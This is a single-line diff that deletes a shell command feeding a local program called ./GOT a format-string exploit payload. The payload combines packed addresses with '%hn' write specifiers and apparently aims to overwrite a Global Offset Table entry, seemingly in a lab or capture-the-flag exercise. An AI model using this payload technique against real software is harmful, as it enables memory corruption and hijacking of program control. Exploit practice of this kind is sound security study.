@@ -1,1 +1,0 @@
-./GOT $(python -c 'print(b"\x06\x40\x00\x00\x04\x40\x00\x00" + b"%22093x%4\$hn%2920x%5\$hn")')
